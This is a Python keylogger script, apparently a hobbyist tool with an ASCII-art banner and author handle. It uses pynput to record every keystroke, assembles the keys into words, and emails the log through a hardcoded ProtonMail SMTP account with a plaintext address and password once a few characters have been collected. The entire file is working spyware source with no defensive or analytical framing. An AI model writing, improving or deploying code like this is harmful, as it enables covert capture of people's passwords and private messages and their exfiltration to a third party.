#keylogger sends to mail .

import pynput
import getpass
import smtplib
from pynput.keyboard import Key, Listener
print('\033[31m','''  
                       _..-'(                       )`-.._
                   ./'. '||  ''.       (\_/)       .//||` .`\.
                  ./'.|'.'||||  |..    )O O(    ..|//||||`.`|.`\.
               ./'..|'.|| |||||\`````` '`"'` ''''''/||||| ||.`|..`\.
             ./'.||'.|||| ||||||||||||.     .|||||||||||| |||||.`||.`\.
            /'|||'.|||||| ||||||||||||{     }|||||||||||| ||||||.`|||`|
           '.|||'.||||||| ||||||||||||{     }|||||||||||| |||||||.`|||.`
          '.||| ||||||||| |/'   ``\||``     ''||/''   `\| ||||||||| |||.`
          |/' \./'     `\./         \!|\   /|!/         \./'     `\./ `\|
          V    V         V          }' `\ /' `{          V         V    V
          `    `         `               V               '         '    ')
        ''')
print('\033[96m','  _______ _________ _______  _______  _        _______  _______  _______  _______  _______ ')
print('\033[96m',' (  ____ \\__   __/(  ____ \(  ____ \( \      (  ___  )(  ____ \(  ____ \(  ____ \(  ____ )')
print('\033[96m',' | (    \/   ) (   | (    \/| (    \/| (      | (   ) || (    \/| (    \/| (    \/| (    )|')
print('\033[96m',' | (_____    | |   | (__    | (__    | |      | |   | || |      | |      | (__    | (____)|')
print('\033[96m',' (_____  )   | |   |  __)   |  __)   | |      | |   | || | ____ | | ____ |  __)   |     __)')
print('\033[96m','       ) |   | |   | (      | (      | |      | |   | || | \_  )| | \_  )| (      | (\ (')
print('\033[96m',' /\____) |   | |   | (____/\| (____/\| (____/\| (___) || (___) || (___) || (____/\| ) \ \__')
print('\033[96m',' \_______)   )_(   (_______/(_______/(_______/(_______)(_______)(_______)(_______/|/   \__/')
print('version: 1.0   by :z1gz4g')

#set up email
email= 'dianeshelton@protonmail.com'
password= 'protonpass111qqq111'
server=smtplib.SMTP('smtp.protonmail.com',1025) #instead of SMTP_SSL ,check website smtp port and protocol
server.login(email,password)


#logger
full_log=''
word=''
email_char_limit=10

count=0
keys=[]
def on_press(key):
    global full_log,word,email_char_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word=''
        if len(full_log) >= email_char_limit:
            send_log()
            full_log=''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word [:-1]
    else:
        char = f'{key}'
        char = char [1:-1]
        word += char
    if key == Key.esc:
        return false

def send_log():
    server.sendmail(email,email,full_log)



with Listener(on_press=on_press) as listener:
    listener.join()